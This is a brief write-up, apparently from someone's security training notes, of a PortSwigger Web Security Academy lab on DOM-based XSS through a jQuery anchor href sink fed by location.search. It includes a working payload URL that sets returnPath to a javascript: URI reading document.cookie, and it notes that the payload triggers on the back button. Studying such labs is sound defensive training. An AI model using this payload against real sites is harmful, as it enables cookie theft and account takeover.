**DOM XSS in jQuery anchor href attribute sink using location.search source**

Vuln in the anchor tag. returnPath is shown when we submit a comment. 
Our payload 
```
https://0a33003004e1337383f410be008e00d0.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
``` 
 

Trigger when we press the back button
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/4b03d417-aa40-4633-8468-c9c2f09c6e5a)


